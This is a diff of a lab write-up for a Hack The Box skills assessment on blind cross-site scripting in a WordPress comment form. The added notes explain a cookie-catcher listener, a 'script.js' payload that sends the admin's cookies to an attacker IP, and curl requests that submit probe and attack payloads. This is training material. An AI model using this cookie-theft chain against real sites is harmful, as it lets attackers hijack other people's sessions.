@@ -1,6 +1,6 @@
 # Section 10 — Skills Assessment
 
-**Scenario:** WordPress 5.7.2 "Security Blog" with moderated comments. Find blind XSS, steal the admin's `flag` cookie.
+**Scenario:** WordPress 5.7.2 "Security Blog" with moderated comments. Find blind Cross-Site Scripting (XSS), steal the admin's `flag` cookie.
 
 **Target:** `10.129.96.115` (HTB VPN), path `/assessment/`
 
@@ -54,6 +54,7 @@ EOF
 
 php -S 0.0.0.0:8080 &
 ```
+> Creates the cookie-catcher PHP page plus the `script.js` exfil payload and starts a background PHP server on port 8080 — swap the attacker IP:port for your tun0 address.
 
 ---
 
@@ -71,6 +72,7 @@ curl -sk -X POST "http://10.129.96.115/assessment/wp-comments-post.php" \
   --data-urlencode "comment_post_ID=8" \
   --data-urlencode "comment_parent=0"
 ```
+> Submits a comment with unique probe payloads in each field. Each `<script src=...>` uses a different URL path so your listener can identify which field triggered. Replace `10.10.17.176:8080` with your tun0 IP and listener port.
 
 Wait ~3-5 minutes for the admin bot's cron to load the comment queue. Listener output:
 
@@ -98,6 +100,7 @@ curl -sk -X POST "http://10.129.96.115/assessment/wp-comments-post.php" \
   --data-urlencode "comment_post_ID=8" \
   --data-urlencode "comment_parent=0"
 ```
+> Submits the real attack payload. The `url` field loads `script.js` from your listener. When the admin reviews pending comments, their browser fetches and runs the script, sending their cookies back to you.
 
 When the admin views the queue, `script.js` runs and ships `document.cookie` to the listener.
 
